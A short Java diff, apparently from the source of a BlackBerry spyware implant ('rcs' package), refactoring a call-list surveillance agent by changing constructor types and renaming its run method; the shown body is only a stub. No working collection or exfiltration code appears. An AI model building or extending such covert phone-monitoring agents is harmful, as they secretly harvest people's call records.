@@ -13,17 +13,17 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class CallListAgent extends Agent {
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
 
-    public CallListAgent(int agentStatus) {
+    public CallListAgent(boolean agentStatus) {
         super(Agent.AGENT_CALLLIST, agentStatus, true);
 
     }
 
-    protected CallListAgent(int agentStatus, byte[] confParams) {
+    protected CallListAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
 
         this.sleepUntilStopped();
